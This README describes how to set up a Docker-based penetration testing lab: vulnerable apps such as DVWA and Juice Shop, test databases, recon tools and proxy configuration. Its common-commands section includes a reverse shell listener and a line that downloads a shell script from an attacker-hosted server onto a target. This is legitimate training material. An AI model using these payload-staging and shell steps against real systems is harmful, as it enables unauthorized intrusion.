# 🔐 vulnlab-quickstart

> A self-contained, Docker-based penetration testing environment for security teams. Covers vulnerable web applications, test databases, recon tooling, and proxy setup — all spun up with a single script.

---

> [!WARNING]
> **For Educational Purposes Only.**
> This project is intended strictly for learning, research, and authorized security testing in isolated lab environments. The tools and vulnerable applications included here are designed to be exploited — **only within this controlled setup**. Do not use any part of this toolkit against systems you do not own or have explicit written permission to test. Unauthorized use against real systems is illegal and unethical. The maintainers of this repository accept no liability for misuse.

---

## 🤝 Contributing & Collaboration

This project is open to contributions from the security community. If you find a bug, want to add a new lab application, improve documentation, or suggest a tool — you're very welcome to get involved.

- **Found an issue?** → [Open a GitHub Issue](../../issues/new) — describe the problem, your OS, and steps to reproduce.
- **Have an improvement?** → [Submit a Pull Request](../../pulls) — fork the repo, make your changes on a new branch, and open a PR with a clear description of what you changed and why.
- **Have an idea or question?** → Start a [Discussion](../../discussions) to talk it through before building.

**PR guidelines:**
- Keep changes focused — one feature or fix per PR
- Update the README if your change affects setup steps or tool lists
- Test your changes on a clean environment before submitting
- Be respectful — this is a learning space for everyone

> ⭐ If this project helped you, consider starring the repo — it helps others find it too.

---

## Table of Contents

1. [Overview](#1-overview)
2. [Prerequisites](#2-prerequisites)
3. [Quick Start](#3-quick-start)
4. [What Gets Installed](#4-what-gets-installed)
   - 4.1 [System Tools](#41-system-tools)
   - 4.2 [Go-Based Recon Tools](#42-go-based-recon-tools)
   - 4.3 [Python Tools](#43-python-tools)
5. [Lab Architecture](#5-lab-architecture)
6. [Accessing Lab Machines](#6-accessing-lab-machines)
   - 6.1 [Vulnerable Web Applications](#61-vulnerable-web-applications)
   - 6.2 [Test Databases](#62-test-databases)
7. [Proxy Setup (Burp Suite & ZAP)](#7-proxy-setup-burp-suite--zap)
   - 7.1 [Burp Suite](#71-burp-suite)
   - 7.2 [OWASP ZAP](#72-owasp-zap)
8. [Working Directory Structure](#8-working-directory-structure)
9. [Managing the Lab](#9-managing-the-lab)
10. [Individual User Onboarding](#10-individual-user-onboarding)
11. [Connecting to HackTheBox & TryHackMe](#11-connecting-to-hackthebox--tryhackme)
12. [Common Tasks & Commands](#12-common-tasks--commands)
13. [Troubleshooting](#13-troubleshooting)
14. [Security & Lab Rules](#14-security--lab-rules)

---

## 1. Overview

This lab provides a fully isolated penetration testing environment that any team member can run locally or on a shared server. It includes:

- **5 vulnerable web applications** (DVWA, Juice Shop, WebGoat, bWAPP, Hackazon)
- **4 test databases** (MySQL, PostgreSQL, MongoDB, Redis) with a phpMyAdmin frontend
- **20+ industry-standard security tools** (nmap, nuclei, subfinder, sqlmap, ffuf, hydra, etc.)
- **Proxy tools** (Burp Suite, OWASP ZAP) pre-installed
- **Structured working directories** for clean, organized engagements

All vulnerable applications run in isolated Docker containers. They are intentionally broken — that is the point. **Never expose these containers to a public network.**

---

## 2. Prerequisites

Before running the setup script, ensure the following are installed on your machine:

| Requirement | Version | Install Guide |
|---|---|---|
| **OS** | Kali Linux, Ubuntu 22.04+, or Debian 12+ | — |
| **Docker Engine** | 24.x+ | https://docs.docker.com/engine/install/ |
| **Docker Compose** | v2+ (`docker compose`) | Bundled with Docker Desktop or install plugin |
| **User permissions** | Non-root user with `sudo` access | `sudo usermod -aG docker $USER` then re-login |
| **Disk space** | ~15 GB free | For Docker images + tools |
| **RAM** | 8 GB minimum, 16 GB recommended | — |

### Verify Docker is ready

```bash
docker --version          # Docker version 24.x.x
docker compose version    # Docker Compose version v2.x.x
docker run hello-world    # Should print "Hello from Docker!"
```

If `docker run hello-world` fails with a permission error, add your user to the Docker group:

```bash
sudo usermod -aG docker $USER
newgrp docker
```

---

## 3. Quick Start

```bash
# 1. Download the setup script
wget https://your-internal-repo/pentest-lab-setup.sh

# 2. Make it executable
chmod +x pentest-lab-setup.sh

# 3. Run it (do NOT run as root)
./pentest-lab-setup.sh

# 4. Reload your shell when done
source ~/.bashrc
```

The script will:
1. Update your system and install all packages
2. Install Go and Python security tools
3. Write a `docker-compose.yml` to `~/pentest-lab/`
4. Pull all Docker images and start the containers
5. Create your working directories under `~/pentests/`
6. Print a full lab access summary

**Total runtime:** ~15–30 minutes depending on internet speed.

---

## 4. What Gets Installed

### 4.1 System Tools

Installed via `apt`. Available system-wide immediately after the script completes.

| Tool | Purpose |
|---|---|
| `nmap` | Network and port scanning |
| `masscan` | High-speed port scanner |
| `burpsuite` | Web proxy and interceptor |
| `zaproxy` | OWASP ZAP web scanner |
| `gobuster` / `ffuf` / `dirsearch` | Directory and file brute-forcing |
| `sqlmap` | Automated SQL injection testing |
| `nikto` | Web server vulnerability scanner |
| `wpscan` | WordPress security scanner |
| `hydra` | Network login brute-forcer |
| `john` / `hashcat` | Password cracking |
| `nmap` | Network mapping and service detection |
| `netcat` | TCP/UDP utility, listener for reverse shells |
| `tmux` | Terminal multiplexer (run multiple sessions) |
| `jq` | JSON parsing in the terminal |
| `whois` / `dnsutils` | Domain and DNS lookup tools |

### 4.2 Go-Based Recon Tools

Installed to `~/go/bin/` and added to your `$PATH`.

| Tool | Purpose |
|---|---|
| `subfinder` | Passive subdomain enumeration |
| `httpx` | HTTP probing and fingerprinting |
| `nuclei` | Template-based vulnerability scanner |
| `katana` | Web crawler / spider |
| `waybackurls` | Pull historical URLs from Wayback Machine |
| `gf` | Pattern-matching grep for bug hunting |
| `gau` | Get all URLs from AlienVault + Wayback |
| `ffuf` | Fast web fuzzer (Go version) |
| `gobuster` | Directory/DNS/VHost brute-forcer |
| `hakrawler` | Simple web crawler |

### 4.3 Python Tools

Installed via `pip3`.

| Tool | Purpose |
|---|---|
| `arjun` | HTTP parameter discovery |
| `uro` | Deduplicate and clean URL lists |
| `requests` | HTTP library for custom scripts |
| `beautifulsoup4` | HTML parsing for scraping |
| `pyjwt` | JWT encode/decode for token testing |

---

## 5. Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Your Host Machine                    │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │              Docker Network (bridge)             │  │
│  │                                                  │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │  │
│  │  │   DVWA   │  │  Juice   │  │   WebGoat    │  │  │
│  │  │  :8080   │  │  Shop    │  │    :8081     │  │  │
│  │  └──────────┘  │  :3000   │  └──────────────┘  │  │
│  │                └──────────┘                     │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │  │
│  │  │  bWAPP   │  │ Hackazon │  │  phpMyAdmin  │  │  │
│  │  │  :8082   │  │  :8083   │  │    :8084     │  │  │
│  │  └──────────┘  └──────────┘  └──────────────┘  │  │
│  │                                                  │  │
│  │  ┌──────────┐  ┌──────────┐  ┌────────────────┐ │  │
│  │  │  MySQL   │  │ Postgres │  │  Mongo / Redis │ │  │
│  │  │  :3306   │  │  :5432   │  │  :27017 :6379  │ │  │
│  │  └──────────┘  └──────────┘  └────────────────┘ │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
│  Burp Suite / ZAP  →  127.0.0.1:8080 / :8085           │
│  ~/pentests/        →  recon | exploits | reports | loot │
└─────────────────────────────────────────────────────────┘
```

All containers communicate via Docker's internal bridge network. Only the ports explicitly mapped are accessible from your host machine (`localhost`).

---

## 6. Accessing Lab Machines

### 6.1 Vulnerable Web Applications

Open your browser and navigate to the relevant URL. All apps run on `localhost` (or the server IP if running on a shared machine).

---

#### DVWA — Damn Vulnerable Web Application

| Field | Value |
|---|---|
| **URL** | http://localhost:8080 |
| **Default credentials** | `admin` / `password` |
| **First-run step** | Visit http://localhost:8080/setup.php and click **Create / Reset Database** |

**What to practice:** SQL Injection, XSS, CSRF, Command Injection, File Upload, Brute Force, File Inclusion. Each vulnerability has Low / Medium / High / Impossible security levels — adjust in the Security settings.

```bash
# Start DVWA if stopped
docker start dvwa
```

---

#### OWASP Juice Shop

| Field | Value |
|---|---|
| **URL** | http://localhost:3000 |
| **Credentials** | Register your own account on first visit |
| **Score board** | http://localhost:3000/#/score-board |

**What to practice:** All OWASP Top 10 categories, JWT forgery, broken access control, XXE, SSRF. Has 100+ challenges with a built-in scoreboard. Best app for CTF-style practice.

```bash
docker start juice-shop
```

---

#### WebGoat

| Field | Value |
|---|---|
| **WebGoat URL** | http://localhost:8081/WebGoat |
| **WebWolf URL** | http://localhost:9090/WebWolf |
| **Credentials** | Register on first visit; both apps use the same credentials |

**What to practice:** Guided lessons with step-by-step hints. Covers injections, XSS, IDOR, path traversal, JWT, authentication flaws. WebWolf is a companion app that simulates a server the attacker controls (for SSRF, file upload callbacks, etc.).

```bash
docker start webgoat
```

---

#### bWAPP

| Field | Value |
|---|---|
| **URL** | http://localhost:8082 |
| **First-run step** | Visit http://localhost:8082/install.php and click **here** to set up the database |
| **Default credentials** | `bee` / `bug` |

**What to practice:** 100+ vulnerabilities. Wide coverage including HTML injection, LDAP injection, XML injection, Shellshock, Heartbleed simulations.

```bash
docker start bwapp
```

---

#### Hackazon

| Field | Value |
|---|---|
| **URL** | http://localhost:8083 |
| **Credentials** | Register on first visit |

**What to practice:** Realistic e-commerce application with vulnerabilities embedded in a real shopping workflow. Good for practicing context-aware attacks.

```bash
docker start hackazon
```

---

### 6.2 Test Databases

These are intentionally open with weak credentials for testing injection and database exploitation techniques.

#### MySQL

```bash
# Connect via CLI
mysql -h 127.0.0.1 -u root -proot

# Or via phpMyAdmin in browser
# http://localhost:8084   →   Username: root   Password: root
```

Useful commands once connected:
```sql
SHOW DATABASES;
USE testdb;
SHOW TABLES;
```

---

#### PostgreSQL

```bash
psql -h 127.0.0.1 -U postgres
# Password: postgres
```

Useful commands:
```sql
\l              -- List databases
\c testdb       -- Connect to a database
\dt             -- List tables
```

---

#### MongoDB

```bash
mongosh mongodb://127.0.0.1:27017
```

Useful commands:
```javascript
show dbs
use testdb
db.users.find()
```

---

#### Redis

```bash
redis-cli -h 127.0.0.1
```

Useful commands:
```
KEYS *
GET <key>
INFO server
```

---

## 7. Proxy Setup (Burp Suite & ZAP)

### 7.1 Burp Suite

**Step 1 — Launch Burp Suite**
```bash
burpsuite &
```
Accept the defaults. Use the Community Edition for most tasks.

**Step 2 — Configure your browser proxy**

Recommended: Install the **FoxyProxy** extension in Firefox for one-click proxy toggling.

Manual configuration in Firefox:
```
Preferences → Network Settings → Manual proxy configuration
HTTP Proxy:  127.0.0.1   Port: 8080
HTTPS Proxy: 127.0.0.1   Port: 8080
☑ Also use this proxy for HTTPS
```

**Step 3 — Install the CA certificate (for HTTPS)**
1. With the proxy enabled, navigate to **http://burpsuite** in your browser
2. Click **CA Certificate** to download `cacert.der`
3. Firefox: `Settings → Privacy & Security → View Certificates → Authorities → Import`
4. Select `cacert.der` → check **Trust this CA to identify websites** → OK

**Step 4 — Verify interception**

Visit http://localhost:3000 (Juice Shop). You should see the request appear in Burp's **Proxy → Intercept** tab.

---

### 7.2 OWASP ZAP

```bash
# Launch ZAP GUI
zaproxy &

# Or run ZAP in Docker (headless, web UI)
docker run -u zap -p 8085:8080 -p 8086:8090 -i \
  ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh
# Access ZAP web UI at http://localhost:8085/zap
```

Set your browser proxy to `127.0.0.1:8085` when using ZAP.

ZAP is better suited for **automated scanning** while Burp is preferred for **manual interception and manipulation**.

---

## 8. Working Directory Structure

The script creates the following layout under your home directory:

```
~/pentests/
├── recon/          ← Subdomain lists, port scans, service fingerprints
├── exploits/       ← PoC scripts, payload files, custom tools
├── reports/        ← Findings, screenshots, markdown/PDF reports
├── loot/           ← Captured credentials, hashes, tokens, keys
└── wordlists/
    └── common.txt  ← SecLists common.txt (auto-downloaded)

~/pentest-lab/
└── docker-compose.yml   ← All lab containers defined here
```

**Recommended workflow per engagement:**
```bash
mkdir -p ~/pentests/recon/target-name
cd ~/pentests/recon/target-name
subfinder -d target.local -o subdomains.txt
httpx -l subdomains.txt -o live-hosts.txt
nuclei -l live-hosts.txt -o nuclei-results.txt
```

---

## 9. Managing the Lab

All container management is done from the `~/pentest-lab/` directory.

```bash
cd ~/pentest-lab

# Check status of all containers
docker compose ps

# Start all containers
docker compose up -d

# Stop all containers
docker compose stop

# Stop and remove containers (data is lost)
docker compose down

# Restart a specific service
docker compose restart dvwa

# View live logs for a service
docker compose logs -f juice-shop

# Pull latest images (update)
docker compose pull
docker compose up -d

# Clean up unused Docker resources (reclaim disk space)
docker system prune -f
```

### Reset a vulnerable app to clean state

```bash
# Remove the container (and its data), then recreate
docker compose rm -sf dvwa
docker compose up -d dvwa
```

---

## 10. Individual User Onboarding

If the lab is running on a **shared team server** rather than a local machine, each team member connects remotely.

### Connecting to a shared lab server

```bash
# SSH into the lab server
ssh username@<lab-server-ip>

# Set up SSH port forwarding to access apps locally in your browser
ssh -L 8080:localhost:8080 \
    -L 3000:localhost:3000 \
    -L 8081:localhost:8081 \
    -L 8082:localhost:8082 \
    -L 8083:localhost:8083 \
    -L 8084:localhost:8084 \
    username@<lab-server-ip>
```

After the tunnel is active, open your local browser and navigate to the same URLs (e.g., http://localhost:3000) — traffic is forwarded to the server.

### New user checklist

- [ ] Docker and Docker Compose installed and working (`docker run hello-world`)
- [ ] Non-root user added to the `docker` group (`sudo usermod -aG docker $USER`)
- [ ] Ran `pentest-lab-setup.sh` successfully
- [ ] `source ~/.bashrc` executed to load `$PATH` changes
- [ ] Verified all containers are up: `docker compose ps`
- [ ] Accessed DVWA at http://localhost:8080 and reset the database at `/setup.php`
- [ ] Burp Suite CA certificate imported into browser
- [ ] FoxyProxy installed for easy proxy switching
- [ ] Working directories exist at `~/pentests/`

### Per-user tool verification

Run this quick check to confirm all major tools are available:

```bash
echo "=== Tool Check ===" && \
for t in nmap sqlmap ffuf gobuster nuclei subfinder httpx hydra john hashcat nikto; do
  command -v $t &>/dev/null && echo "  ✓ $t" || echo "  ✗ $t (missing)"
done
```

---

## 11. Connecting to HackTheBox & TryHackMe

These platforms provide additional remote lab machines for more realistic scenarios.

### HackTheBox

1. Register at https://www.hackthebox.com
2. Download your VPN config file from the **Access** section (`.ovpn` file)
3. Connect:
   ```bash
   sudo openvpn --config ~/Downloads/your-htb-config.ovpn
   ```
4. Verify connection:
   ```bash
   ip addr show tun0     # Should show a 10.x.x.x address
   ping 10.10.10.x       # Ping a target machine
   ```

### TryHackMe

1. Register at https://tryhackme.com
2. Download your VPN config from the **Access** page
3. Connect:
   ```bash
   sudo openvpn --config ~/Downloads/your-thm-config.ovpn
   ```
4. Access lab machines at the IP addresses shown in each room.

> **Note:** Only one VPN connection can be active at a time. Disconnect from HTB before connecting to THM and vice versa.

---

## 12. Common Tasks & Commands

### Start a reverse shell listener

```bash
nc -lvnp 4444
```

### Host a file for download (e.g., a payload)

```bash
cd ~/pentests/exploits
python3 -m http.server 8888
# Download from target: curl http://<your-ip>:8888/shell.sh
```

### Port forwarding through a jump host

```bash
ssh -L 8080:internal-target:80 user@jump-host
# Now http://localhost:8080 reaches internal-target:80
```

### External tunnel with ngrok (expose local service)

```bash
ngrok http 8080
# Useful for webhook callbacks and SSRF testing
```

### Quick subdomain recon

```bash
subfinder -d target.local | httpx -silent | tee ~/pentests/recon/live.txt
```

### Directory brute-force

```bash
ffuf -u http://localhost:8080/FUZZ \
     -w ~/pentests/wordlists/common.txt \
     -mc 200,301,302,403 \
     -o ~/pentests/recon/dirs.json
```

### SQL injection test with sqlmap

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<your-session>;security=low" \
       --dbs --batch
```

### Nuclei scan against local targets

```bash
nuclei -u http://localhost:3000 \
       -t ~/nuclei-templates/ \
       -severity medium,high,critical \
       -o ~/pentests/recon/nuclei-juice.txt
```

---

## 13. Troubleshooting

### Containers not starting

```bash
# Check for port conflicts
sudo ss -tlnp | grep -E "8080|3000|8081|8082|8083"

# View detailed error for a specific container
docker compose logs dvwa

# Hard reset a container
docker compose rm -sf dvwa && docker compose up -d dvwa
```

### "Port already in use" error

Another service (e.g., a local Apache or Burp) is bound to the same port. Either stop that service or change the host port in `~/pentest-lab/docker-compose.yml`:

```yaml
ports:
  - "9080:80"   # Change 8080 to any free port
```

Then restart: `docker compose up -d`

### Go tools not found after install

```bash
source ~/.bashrc
echo $PATH       # Should include /home/<user>/go/bin
which subfinder  # Should return a path
```

### Docker permission denied

```bash
sudo usermod -aG docker $USER
newgrp docker         # Apply without logging out
```

### DVWA shows blank page or DB error

Visit http://localhost:8080/setup.php and click **Create / Reset Database**. This must be done after every container reset.

### Nuclei templates outdated warning

```bash
nuclei -update-templates
```

---

## 14. Security & Lab Rules

> These rules exist to protect both you and your network.

- **Never expose lab containers to the internet.** Do not bind ports to `0.0.0.0` on a public-facing machine without a firewall rule restricting access.
- **Only test on systems you own or have explicit permission to test.** All lab machines here are intentionally vulnerable and designed for practice.
- **Do not use these tools against production systems** or any target outside the lab without written authorization.
- **Isolate the lab network** if running on shared infrastructure. Use Docker network policies or a dedicated VLAN.
- **Rotate default credentials** if the lab server is shared — DVWA, bWAPP, and databases ship with well-known default passwords.
- **Use snapshots or `docker compose down && up`** to reset lab machines to a clean state between practice sessions.
- **Log your activity** in `~/pentests/reports/` — good habit for both learning and legal protection.

---

## Appendix — Port Reference

| Port | Service | URL |
|---|---|---|
| 3000 | Juice Shop | http://localhost:3000 |
| 3306 | MySQL | `mysql -h 127.0.0.1 -u root -proot` |
| 5432 | PostgreSQL | `psql -h 127.0.0.1 -U postgres` |
| 6379 | Redis | `redis-cli -h 127.0.0.1` |
| 8080 | DVWA | http://localhost:8080 |
| 8081 | WebGoat | http://localhost:8081/WebGoat |
| 8082 | bWAPP | http://localhost:8082 |
| 8083 | Hackazon | http://localhost:8083 |
| 8084 | phpMyAdmin | http://localhost:8084 |
| 8085 | ZAP (Docker) | http://localhost:8085/zap |
| 9090 | WebWolf | http://localhost:9090/WebWolf |
| 27017 | MongoDB | `mongosh mongodb://127.0.0.1:27017` |

---

*Last updated: 2026 · Maintained by the Security Team*

---

> **⚠️ Educational Use Only** — This repository and all its contents are provided strictly for learning and authorized lab testing. See the disclaimer at the top of this document. If you'd like to contribute or collaborate, please [open an issue or PR](../../issues).